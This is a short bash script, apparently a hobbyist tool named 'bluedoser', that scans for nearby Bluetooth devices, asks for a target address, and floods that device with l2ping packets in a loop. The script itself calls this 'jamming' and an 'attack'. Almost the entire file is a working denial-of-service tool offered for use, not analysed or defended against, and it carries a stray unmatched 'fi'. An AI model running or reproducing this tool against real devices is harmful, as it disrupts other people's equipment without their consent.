
#COLORS
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"
bln="\033[33m"
bc="\033[0m"
echo -e "$red _     _                _                     $nc"
echo -e "$yellow| |__ | |_   _  ___  __| | ___  ___  ___ ___ $nc"
echo -e "$red| '_ \| | | | |/ _ \/ _  |/ _ \/ __|/ _ \ __|$nc"
echo -e "$yellow| |_) | | |_| |  __/ (_| | (_) \__ \  __/ |   $nc"
echo -e "$red|blue/|_|\__,_|\dos|\__,_|\___/|___/\___|_| $nc"
echo -e "$blue _____________________________________By Anon$nc"
echo ""
echo -e "Author : SURAJ CHAVDA"
echo -e "SCRIPT : SURAJ CHAVDA"
echo -e "ANON   : SURAJ CHAVDA"
sudo lsmod | grep blue &>/dev/null
systemctl enable bluetooth.service &>/dev/null
systemctl start bluetooth.service &>/dev/null

if rfkill unblock bluetooth ;then 
echo -e "Your Bluetooth is Turned On"
else echo -e "Some Problem With Turning On Bluetooth"
fi
echo -e ""

echo -e "$Cyan [*]BLUTOOTH DEVICE(B.D) INFO AND SCANNING$nc"
echo -e ""
hcitool scan
read -p $'\033[1;33m[*]Enter B.D.Address (xx:xx:xx:xx:xx:xx) : \033[0m' bdadd
echo -e "" 
read -p $'\033[1;33m[*]PRESS ENTER TO START YOUR ATTACK\033[0m'
l2ping -f $bdadd  & while [ 1 ]; do echo -e "$red Bluetooth is Started Jamming$nc $yellow By Anon.....$nc" & sleep 0.6 ;done
fi

rfkill block bluetooth &>/dev/null

echo -e "Tool By Anon(Suraj)"
